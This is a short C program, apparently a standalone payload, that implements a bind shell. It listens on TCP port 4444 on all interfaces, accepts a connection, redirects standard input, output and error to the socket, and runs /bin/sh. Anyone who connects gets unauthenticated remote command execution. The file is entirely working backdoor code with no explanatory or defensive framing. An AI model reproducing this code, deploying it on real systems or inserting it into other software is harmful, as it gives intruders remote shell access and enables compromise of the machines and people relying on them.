#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Define the server address structure
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(4444); // Port 4444 in network byte order

    // Bind the socket to the server address
    if (bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Start listening for incoming connections
    if (listen(sockfd, 5) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    // Accept incoming connections
    int newsockfd = accept(sockfd, NULL, NULL);
    if (newsockfd < 0) {
        perror("Accept failed");
        exit(EXIT_FAILURE);
    }

    // Redirect standard input, output, and error to the new socket
    dup2(newsockfd, 0); // stdin
    dup2(newsockfd, 1); // stdout
    dup2(newsockfd, 2); // stderr

    // Execute /bin/sh
    execl("/bin/sh", "sh", NULL);

    return 0;
}
